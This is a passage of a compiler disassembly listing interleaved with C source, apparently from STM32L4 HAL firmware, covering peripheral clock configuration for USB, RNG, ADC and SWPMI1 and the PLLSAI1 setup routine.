 800486a:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 800486e:	60d3      	str	r3, [r2, #12]
 8004870:	e011      	b.n	8004896 <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 8004872:	687b      	ldr	r3, [r7, #4]
 8004874:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004876:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 800487a:	d10c      	bne.n	8004896 <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 800487c:	687b      	ldr	r3, [r7, #4]
 800487e:	3304      	adds	r3, #4
 8004880:	2101      	movs	r1, #1
 8004882:	4618      	mov	r0, r3
 8004884:	f000 f882 	bl	800498c <RCCEx_PLLSAI1_Config>
 8004888:	4603      	mov	r3, r0
 800488a:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 800488c:	7cfb      	ldrb	r3, [r7, #19]
 800488e:	2b00      	cmp	r3, #0
 8004890:	d001      	beq.n	8004896 <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 8004892:	7cfb      	ldrb	r3, [r7, #19]
 8004894:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 8004896:	687b      	ldr	r3, [r7, #4]
 8004898:	681b      	ldr	r3, [r3, #0]
 800489a:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 800489e:	2b00      	cmp	r3, #0
 80048a0:	d028      	beq.n	80048f4 <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 80048a2:	4b31      	ldr	r3, [pc, #196]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048a4:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048a8:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 80048ac:	687b      	ldr	r3, [r7, #4]
 80048ae:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80048b0:	492d      	ldr	r1, [pc, #180]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048b2:	4313      	orrs	r3, r2
 80048b4:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
 80048b8:	687b      	ldr	r3, [r7, #4]
 80048ba:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80048bc:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 80048c0:	d106      	bne.n	80048d0 <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 80048c2:	4b29      	ldr	r3, [pc, #164]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048c4:	68db      	ldr	r3, [r3, #12]
 80048c6:	4a28      	ldr	r2, [pc, #160]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048c8:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 80048cc:	60d3      	str	r3, [r2, #12]
 80048ce:	e011      	b.n	80048f4 <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 80048d0:	687b      	ldr	r3, [r7, #4]
 80048d2:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80048d4:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 80048d8:	d10c      	bne.n	80048f4 <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 80048da:	687b      	ldr	r3, [r7, #4]
 80048dc:	3304      	adds	r3, #4
 80048de:	2101      	movs	r1, #1
 80048e0:	4618      	mov	r0, r3
 80048e2:	f000 f853 	bl	800498c <RCCEx_PLLSAI1_Config>
 80048e6:	4603      	mov	r3, r0
 80048e8:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 80048ea:	7cfb      	ldrb	r3, [r7, #19]
 80048ec:	2b00      	cmp	r3, #0
 80048ee:	d001      	beq.n	80048f4 <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 80048f0:	7cfb      	ldrb	r3, [r7, #19]
 80048f2:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 80048f4:	687b      	ldr	r3, [r7, #4]
 80048f6:	681b      	ldr	r3, [r3, #0]
 80048f8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80048fc:	2b00      	cmp	r3, #0
 80048fe:	d01c      	beq.n	800493a <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 8004900:	4b19      	ldr	r3, [pc, #100]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004902:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004906:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 800490a:	687b      	ldr	r3, [r7, #4]
 800490c:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 800490e:	4916      	ldr	r1, [pc, #88]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004910:	4313      	orrs	r3, r2
 8004912:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 8004916:	687b      	ldr	r3, [r7, #4]
 8004918:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 800491a:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 800491e:	d10c      	bne.n	800493a <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 8004920:	687b      	ldr	r3, [r7, #4]
 8004922:	3304      	adds	r3, #4
 8004924:	2102      	movs	r1, #2
 8004926:	4618      	mov	r0, r3
 8004928:	f000 f830 	bl	800498c <RCCEx_PLLSAI1_Config>
 800492c:	4603      	mov	r3, r0
 800492e:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004930:	7cfb      	ldrb	r3, [r7, #19]
 8004932:	2b00      	cmp	r3, #0
 8004934:	d001      	beq.n	800493a <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 8004936:	7cfb      	ldrb	r3, [r7, #19]
 8004938:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 800493a:	687b      	ldr	r3, [r7, #4]
 800493c:	681b      	ldr	r3, [r3, #0]
 800493e:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8004942:	2b00      	cmp	r3, #0
 8004944:	d00a      	beq.n	800495c <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 8004946:	4b08      	ldr	r3, [pc, #32]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004948:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800494c:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 8004950:	687b      	ldr	r3, [r7, #4]
 8004952:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8004954:	4904      	ldr	r1, [pc, #16]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004956:	4313      	orrs	r3, r2
 8004958:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 800495c:	7cbb      	ldrb	r3, [r7, #18]
}
 800495e:	4618      	mov	r0, r3
 8004960:	3718      	adds	r7, #24
 8004962:	46bd      	mov	sp, r7
 8004964:	bd80      	pop	{r7, pc}
 8004966:	bf00      	nop
 8004968:	40021000 	.word	0x40021000

0800496c <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 800496c:	b480      	push	{r7}
 800496e:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 8004970:	4b05      	ldr	r3, [pc, #20]	; (8004988 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004972:	681b      	ldr	r3, [r3, #0]
 8004974:	4a04      	ldr	r2, [pc, #16]	; (8004988 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004976:	f043 0304 	orr.w	r3, r3, #4
 800497a:	6013      	str	r3, [r2, #0]
}
 800497c:	bf00      	nop
 800497e:	46bd      	mov	sp, r7
 8004980:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004984:	4770      	bx	lr
 8004986:	bf00      	nop
 8004988:	40021000 	.word	0x40021000

0800498c <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 800498c:	b580      	push	{r7, lr}
 800498e:	b084      	sub	sp, #16
 8004990:	af00      	add	r7, sp, #0
 8004992:	6078      	str	r0, [r7, #4]
 8004994:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 8004996:	2300      	movs	r3, #0
 8004998:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 800499a:	4b74      	ldr	r3, [pc, #464]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 800499c:	68db      	ldr	r3, [r3, #12]
 800499e:	f003 0303 	and.w	r3, r3, #3
 80049a2:	2b00      	cmp	r3, #0
 80049a4:	d018      	beq.n	80049d8 <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 80049a6:	4b71      	ldr	r3, [pc, #452]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049a8:	68db      	ldr	r3, [r3, #12]
 80049aa:	f003 0203 	and.w	r2, r3, #3
 80049ae:	687b      	ldr	r3, [r7, #4]
 80049b0:	681b      	ldr	r3, [r3, #0]
 80049b2:	429a      	cmp	r2, r3
 80049b4:	d10d      	bne.n	80049d2 <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 80049b6:	687b      	ldr	r3, [r7, #4]
 80049b8:	681b      	ldr	r3, [r3, #0]
       ||
 80049ba:	2b00      	cmp	r3, #0
 80049bc:	d009      	beq.n	80049d2 <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 80049be:	4b6b      	ldr	r3, [pc, #428]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049c0:	68db      	ldr	r3, [r3, #12]
 80049c2:	091b      	lsrs	r3, r3, #4
 80049c4:	f003 0307 	and.w	r3, r3, #7
 80049c8:	1c5a      	adds	r2, r3, #1
 80049ca:	687b      	ldr	r3, [r7, #4]
 80049cc:	685b      	ldr	r3, [r3, #4]
       ||
 80049ce:	429a      	cmp	r2, r3
 80049d0:	d047      	beq.n	8004a62 <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 80049d2:	2301      	movs	r3, #1
 80049d4:	73fb      	strb	r3, [r7, #15]
 80049d6:	e044      	b.n	8004a62 <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 80049d8:	687b      	ldr	r3, [r7, #4]
 80049da:	681b      	ldr	r3, [r3, #0]
 80049dc:	2b03      	cmp	r3, #3
 80049de:	d018      	beq.n	8004a12 <RCCEx_PLLSAI1_Config+0x86>
 80049e0:	2b03      	cmp	r3, #3
 80049e2:	d825      	bhi.n	8004a30 <RCCEx_PLLSAI1_Config+0xa4>
 80049e4:	2b01      	cmp	r3, #1
 80049e6:	d002      	beq.n	80049ee <RCCEx_PLLSAI1_Config+0x62>
 80049e8:	2b02      	cmp	r3, #2
 80049ea:	d009      	beq.n	8004a00 <RCCEx_PLLSAI1_Config+0x74>
 80049ec:	e020      	b.n	8004a30 <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 80049ee:	4b5f      	ldr	r3, [pc, #380]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049f0:	681b      	ldr	r3, [r3, #0]
 80049f2:	f003 0302 	and.w	r3, r3, #2
 80049f6:	2b00      	cmp	r3, #0
 80049f8:	d11d      	bne.n	8004a36 <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 80049fa:	2301      	movs	r3, #1
 80049fc:	73fb      	strb	r3, [r7, #15]
      }
      break;
 80049fe:	e01a      	b.n	8004a36 <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 8004a00:	4b5a      	ldr	r3, [pc, #360]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a02:	681b      	ldr	r3, [r3, #0]
 8004a04:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004a08:	2b00      	cmp	r3, #0
 8004a0a:	d116      	bne.n	8004a3a <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 8004a0c:	2301      	movs	r3, #1
 8004a0e:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004a10:	e013      	b.n	8004a3a <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 8004a12:	4b56      	ldr	r3, [pc, #344]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a14:	681b      	ldr	r3, [r3, #0]
 8004a16:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004a1a:	2b00      	cmp	r3, #0
 8004a1c:	d10f      	bne.n	8004a3e <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
 8004a1e:	4b53      	ldr	r3, [pc, #332]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a20:	681b      	ldr	r3, [r3, #0]
 8004a22:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004a26:	2b00      	cmp	r3, #0
 8004a28:	d109      	bne.n	8004a3e <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 8004a2a:	2301      	movs	r3, #1
 8004a2c:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 8004a2e:	e006      	b.n	8004a3e <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 8004a30:	2301      	movs	r3, #1
 8004a32:	73fb      	strb	r3, [r7, #15]
      break;
 8004a34:	e004      	b.n	8004a40 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004a36:	bf00      	nop
 8004a38:	e002      	b.n	8004a40 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004a3a:	bf00      	nop
 8004a3c:	e000      	b.n	8004a40 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004a3e:	bf00      	nop
    }

    if(status == HAL_OK)
 8004a40:	7bfb      	ldrb	r3, [r7, #15]
 8004a42:	2b00      	cmp	r3, #0
 8004a44:	d10d      	bne.n	8004a62 <RCCEx_PLLSAI1_Config+0xd6>
#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 8004a46:	4b49      	ldr	r3, [pc, #292]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a48:	68db      	ldr	r3, [r3, #12]
 8004a4a:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 8004a4e:	687b      	ldr	r3, [r7, #4]
 8004a50:	6819      	ldr	r1, [r3, #0]
 8004a52:	687b      	ldr	r3, [r7, #4]
 8004a54:	685b      	ldr	r3, [r3, #4]
 8004a56:	3b01      	subs	r3, #1
 8004a58:	011b      	lsls	r3, r3, #4
 8004a5a:	430b      	orrs	r3, r1
 8004a5c:	4943      	ldr	r1, [pc, #268]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a5e:	4313      	orrs	r3, r2
 8004a60:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 8004a62:	7bfb      	ldrb	r3, [r7, #15]
 8004a64:	2b00      	cmp	r3, #0
 8004a66:	d17c      	bne.n	8004b62 <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 8004a68:	4b40      	ldr	r3, [pc, #256]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a6a:	681b      	ldr	r3, [r3, #0]
 8004a6c:	4a3f      	ldr	r2, [pc, #252]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a6e:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 8004a72:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004a74:	f7fc fbc8 	bl	8001208 <HAL_GetTick>
 8004a78:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004a7a:	e009      	b.n	8004a90 <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004a7c:	f7fc fbc4 	bl	8001208 <HAL_GetTick>
 8004a80:	4602      	mov	r2, r0
 8004a82:	68bb      	ldr	r3, [r7, #8]
 8004a84:	1ad3      	subs	r3, r2, r3
 8004a86:	2b02      	cmp	r3, #2
 8004a88:	d902      	bls.n	8004a90 <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 8004a8a:	2303      	movs	r3, #3
 8004a8c:	73fb      	strb	r3, [r7, #15]
        break;
 8004a8e:	e005      	b.n	8004a9c <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004a90:	4b36      	ldr	r3, [pc, #216]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a92:	681b      	ldr	r3, [r3, #0]
 8004a94:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004a98:	2b00      	cmp	r3, #0
 8004a9a:	d1ef      	bne.n	8004a7c <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
 8004a9c:	7bfb      	ldrb	r3, [r7, #15]
 8004a9e:	2b00      	cmp	r3, #0
 8004aa0:	d15f      	bne.n	8004b62 <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004aa2:	683b      	ldr	r3, [r7, #0]
 8004aa4:	2b00      	cmp	r3, #0
 8004aa6:	d110      	bne.n	8004aca <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004aa8:	4b30      	ldr	r3, [pc, #192]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004aaa:	691b      	ldr	r3, [r3, #16]
 8004aac:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 8004ab0:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004ab4:	687a      	ldr	r2, [r7, #4]
 8004ab6:	6892      	ldr	r2, [r2, #8]
 8004ab8:	0211      	lsls	r1, r2, #8
 8004aba:	687a      	ldr	r2, [r7, #4]
 8004abc:	68d2      	ldr	r2, [r2, #12]
 8004abe:	06d2      	lsls	r2, r2, #27
 8004ac0:	430a      	orrs	r2, r1
 8004ac2:	492a      	ldr	r1, [pc, #168]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ac4:	4313      	orrs	r3, r2
 8004ac6:	610b      	str	r3, [r1, #16]
 8004ac8:	e027      	b.n	8004b1a <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 8004aca:	683b      	ldr	r3, [r7, #0]
 8004acc:	2b01      	cmp	r3, #1
 8004ace:	d112      	bne.n	8004af6 <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004ad0:	4b26      	ldr	r3, [pc, #152]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ad2:	691b      	ldr	r3, [r3, #16]
 8004ad4:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 8004ad8:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004adc:	687a      	ldr	r2, [r7, #4]
 8004ade:	6892      	ldr	r2, [r2, #8]
 8004ae0:	0211      	lsls	r1, r2, #8
 8004ae2:	687a      	ldr	r2, [r7, #4]
 8004ae4:	6912      	ldr	r2, [r2, #16]
 8004ae6:	0852      	lsrs	r2, r2, #1
 8004ae8:	3a01      	subs	r2, #1
 8004aea:	0552      	lsls	r2, r2, #21
 8004aec:	430a      	orrs	r2, r1
 8004aee:	491f      	ldr	r1, [pc, #124]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004af0:	4313      	orrs	r3, r2
 8004af2:	610b      	str	r3, [r1, #16]
 8004af4:	e011      	b.n	8004b1a <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004af6:	4b1d      	ldr	r3, [pc, #116]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004af8:	691b      	ldr	r3, [r3, #16]
 8004afa:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 8004afe:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004b02:	687a      	ldr	r2, [r7, #4]
 8004b04:	6892      	ldr	r2, [r2, #8]
 8004b06:	0211      	lsls	r1, r2, #8
 8004b08:	687a      	ldr	r2, [r7, #4]
 8004b0a:	6952      	ldr	r2, [r2, #20]
 8004b0c:	0852      	lsrs	r2, r2, #1
 8004b0e:	3a01      	subs	r2, #1
 8004b10:	0652      	lsls	r2, r2, #25
 8004b12:	430a      	orrs	r2, r1
 8004b14:	4915      	ldr	r1, [pc, #84]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b16:	4313      	orrs	r3, r2
 8004b18:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004b1a:	4b14      	ldr	r3, [pc, #80]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b1c:	681b      	ldr	r3, [r3, #0]
 8004b1e:	4a13      	ldr	r2, [pc, #76]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b20:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004b24:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004b26:	f7fc fb6f 	bl	8001208 <HAL_GetTick>
 8004b2a:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004b2c:	e009      	b.n	8004b42 <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004b2e:	f7fc fb6b 	bl	8001208 <HAL_GetTick>
 8004b32:	4602      	mov	r2, r0
 8004b34:	68bb      	ldr	r3, [r7, #8]
 8004b36:	1ad3      	subs	r3, r2, r3
 8004b38:	2b02      	cmp	r3, #2
 8004b3a:	d902      	bls.n	8004b42 <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004b3c:	2303      	movs	r3, #3
 8004b3e:	73fb      	strb	r3, [r7, #15]
          break;
 8004b40:	e005      	b.n	8004b4e <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004b42:	4b0a      	ldr	r3, [pc, #40]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b44:	681b      	ldr	r3, [r3, #0]
 8004b46:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004b4a:	2b00      	cmp	r3, #0
 8004b4c:	d0ef      	beq.n	8004b2e <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004b4e:	7bfb      	ldrb	r3, [r7, #15]
 8004b50:	2b00      	cmp	r3, #0
 8004b52:	d106      	bne.n	8004b62 <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
